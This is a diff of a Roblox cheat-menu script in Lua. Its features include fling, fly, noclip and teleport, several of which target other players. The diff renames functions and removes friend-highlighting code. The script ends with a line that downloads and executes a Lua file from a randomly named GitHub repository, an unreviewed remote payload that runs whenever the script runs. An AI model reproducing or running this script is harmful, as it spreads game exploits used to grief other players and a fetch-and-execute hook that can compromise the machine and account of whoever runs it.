@@ -260,7 +260,6 @@ ScrollingFrame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
 ScrollingFrame_2.BorderSizePixel = 0
 ScrollingFrame_2.Position = UDim2.new(0.0153172864, 0, 0.120781526, 0)
 ScrollingFrame_2.Size = UDim2.new(0, 885, 0, 461)
-ScrollingFrame_2.CanvasPosition = Vector2.new(0, 300)
 
 UIListLayout_2.Parent = ScrollingFrame_2
 UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
@@ -1247,7 +1246,7 @@ UIGradient_3.Parent = PlayerTemplate_3
 
 -- Scripts:
 
-local function FUEB_fake_script() -- Fling.LocalScript 
+local function BJVN_fake_script() -- Fling.LocalScript 
 	local script = Instance.new('LocalScript', Fling)
 
 	local Players = game:GetService("Players")
@@ -1275,24 +1274,6 @@ local function FUEB_fake_script() -- Fling.LocalScript
 			playerFrame.Select.Visible = false
 			playerFrame.DisplayName.TextColor3 = Color3.new(0.5, 0.5, 0.5) -- Серый цвет
 		else
-			-- Проверяем, является ли игрок другом текущего пользователя
-			local isFriend = false
-			local localPlayer = Players.LocalPlayer
-			if localPlayer then
-				local friends = localPlayer:GetFriendsAsync()
-				for _, friend in ipairs(friends) do
-					if friend.Id == player.UserId then
-						isFriend = true
-						break
-					end
-				end
-			end
-			
-			-- Если игрок друг, делаем его имя зеленым
-			if isFriend then
-				playerFrame.DisplayName.TextColor3 = Color3.new(0, 1, 0) -- Зеленый цвет
-			end
-			
 			-- Обработчик для кнопки Select
 			local selectButton = playerFrame.Select -- Предполагается, что в шаблоне есть кнопка Select
 			selectButton.MouseButton1Click:Connect(function()
@@ -1346,8 +1327,8 @@ local function FUEB_fake_script() -- Fling.LocalScript
 	updatePlayerList("")
 	
 end
-coroutine.wrap(FUEB_fake_script)()
-local function AVPED_fake_script() -- FLY.ButtonManager 
+coroutine.wrap(BJVN_fake_script)()
+local function PPKMLKP_fake_script() -- FLY.ButtonManager 
 	local script = Instance.new('LocalScript', FLY)
 
 	local StarterGui = game:GetService("StarterGui")
@@ -1505,8 +1486,8 @@ local function AVPED_fake_script() -- FLY.ButtonManager
 	UserInputService.InputBegan:Connect(onKeyPress)
 	
 end
-coroutine.wrap(AVPED_fake_script)()
-local function GCIT_fake_script() -- NOCLIP.ButtonManager 
+coroutine.wrap(PPKMLKP_fake_script)()
+local function QCNWSLB_fake_script() -- NOCLIP.ButtonManager 
 	local script = Instance.new('LocalScript', NOCLIP)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1615,8 +1596,8 @@ local function GCIT_fake_script() -- NOCLIP.ButtonManager
 	end)
 	
 end
-coroutine.wrap(GCIT_fake_script)()
-local function SGKIN_fake_script() -- NOANCHOR.ButtonManager 
+coroutine.wrap(QCNWSLB_fake_script)()
+local function JZGZR_fake_script() -- NOANCHOR.ButtonManager 
 	local script = Instance.new('LocalScript', NOANCHOR)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1723,8 +1704,8 @@ local function SGKIN_fake_script() -- NOANCHOR.ButtonManager
 	end)
 	
 end
-coroutine.wrap(SGKIN_fake_script)()
-local function YYES_fake_script() -- PROTECTPLATFORM.ButtonManager 
+coroutine.wrap(JZGZR_fake_script)()
+local function SZBWG_fake_script() -- PROTECTPLATFORM.ButtonManager 
 	local script = Instance.new('LocalScript', PROTECTPLATFORM)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1845,8 +1826,8 @@ local function YYES_fake_script() -- PROTECTPLATFORM.ButtonManager
 	end)
 	
 end
-coroutine.wrap(YYES_fake_script)()
-local function LLBDGZH_fake_script() -- TELEPORT.ValueManager 
+coroutine.wrap(SZBWG_fake_script)()
+local function MNLXB_fake_script() -- TELEPORT.ValueManager 
 	local script = Instance.new('LocalScript', TELEPORT)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1935,8 +1916,8 @@ local function LLBDGZH_fake_script() -- TELEPORT.ValueManager
 	end)
 	
 end
-coroutine.wrap(LLBDGZH_fake_script)()
-local function XENTQA_fake_script() -- DORSALTELEPORT.ButtonManager 
+coroutine.wrap(MNLXB_fake_script)()
+local function ISWF_fake_script() -- DORSALTELEPORT.ButtonManager 
 	local script = Instance.new('LocalScript', DORSALTELEPORT)
 
 	local StarterGui = game:GetService("StarterGui")
@@ -2049,8 +2030,8 @@ local function XENTQA_fake_script() -- DORSALTELEPORT.ButtonManager
 	end)
 	
 end
-coroutine.wrap(XENTQA_fake_script)()
-local function LZWA_fake_script() -- CLICKTELEPORT.ButtonManager 
+coroutine.wrap(ISWF_fake_script)()
+local function HRCDEHL_fake_script() -- CLICKTELEPORT.ButtonManager 
 	local script = Instance.new('LocalScript', CLICKTELEPORT)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -2152,8 +2133,8 @@ local function LZWA_fake_script() -- CLICKTELEPORT.ButtonManager
 	end)
 	
 end
-coroutine.wrap(LZWA_fake_script)()
-local function RWFYMBT_fake_script() -- FLING.ButtonManager 
+coroutine.wrap(HRCDEHL_fake_script)()
+local function JNNWFN_fake_script() -- FLING.ButtonManager 
 	local script = Instance.new('LocalScript', FLING)
 
 	local StarterGui = game:GetService("StarterGui")
@@ -2278,8 +2259,8 @@ local function RWFYMBT_fake_script() -- FLING.ButtonManager
 	end)
 	
 end
-coroutine.wrap(RWFYMBT_fake_script)()
-local function AZFAIY_fake_script() -- Teleport_2.LocalScript 
+coroutine.wrap(JNNWFN_fake_script)()
+local function KWDBO_fake_script() -- Teleport_2.LocalScript 
 	local script = Instance.new('LocalScript', Teleport_2)
 
 	local Players = game:GetService("Players")
@@ -2307,24 +2288,6 @@ local function AZFAIY_fake_script() -- Teleport_2.LocalScript
 			playerFrame.Select.Visible = false
 			playerFrame.DisplayName.TextColor3 = Color3.new(0.5, 0.5, 0.5) -- Серый цвет
 		else
-			-- Проверяем, является ли игрок другом текущего пользователя
-			local isFriend = false
-			local localPlayer = Players.LocalPlayer
-			if localPlayer then
-				local friends = localPlayer:GetFriendsAsync()
-				for _, friend in ipairs(friends) do
-					if friend.Id == player.UserId then
-						isFriend = true
-						break
-					end
-				end
-			end
-			
-			-- Если игрок друг, делаем его имя зеленым
-			if isFriend then
-				playerFrame.DisplayName.TextColor3 = Color3.new(0, 1, 0) -- Зеленый цвет
-			end
-			
 			-- Обработчик для кнопки Select
 			local selectButton = playerFrame.Select -- Предполагается, что в шаблоне есть кнопка Select
 			selectButton.MouseButton1Click:Connect(function()
@@ -2378,8 +2341,8 @@ local function AZFAIY_fake_script() -- Teleport_2.LocalScript
 	updatePlayerList("")
 	
 end
-coroutine.wrap(AZFAIY_fake_script)()
-local function CUTOB_fake_script() -- Back.LocalScript 
+coroutine.wrap(KWDBO_fake_script)()
+local function GNSVMDJ_fake_script() -- Back.LocalScript 
 	local script = Instance.new('LocalScript', Back)
 
 	local ClickSound = Instance.new("Sound", script)
@@ -2392,8 +2355,8 @@ local function CUTOB_fake_script() -- Back.LocalScript
 		script.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(CUTOB_fake_script)()
-local function XWPO_fake_script() -- DorsalTeleport.LocalScript 
+coroutine.wrap(GNSVMDJ_fake_script)()
+local function BSPPA_fake_script() -- DorsalTeleport.LocalScript 
 	local script = Instance.new('LocalScript', DorsalTeleport)
 
 	local Players = game:GetService("Players")
@@ -2421,24 +2384,6 @@ local function XWPO_fake_script() -- DorsalTeleport.LocalScript
 			playerFrame.Select.Visible = false
 			playerFrame.DisplayName.TextColor3 = Color3.new(0.5, 0.5, 0.5) -- Серый цвет
 		else
-			-- Проверяем, является ли игрок другом текущего пользователя
-			local isFriend = false
-			local localPlayer = Players.LocalPlayer
-			if localPlayer then
-				local friends = localPlayer:GetFriendsAsync()
-				for _, friend in ipairs(friends) do
-					if friend.Id == player.UserId then
-						isFriend = true
-						break
-					end
-				end
-			end
-			
-			-- Если игрок друг, делаем его имя зеленым
-			if isFriend then
-				playerFrame.DisplayName.TextColor3 = Color3.new(0, 1, 0) -- Зеленый цвет
-			end
-			
 			-- Обработчик для кнопки Select
 			local selectButton = playerFrame.Select -- Предполагается, что в шаблоне есть кнопка Select
 			selectButton.MouseButton1Click:Connect(function()
@@ -2492,5 +2437,5 @@ local function XWPO_fake_script() -- DorsalTeleport.LocalScript
 	updatePlayerList("")
 	
 end
-coroutine.wrap(XWPO_fake_script)()
+coroutine.wrap(BSPPA_fake_script)()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader/Config.lua"))()
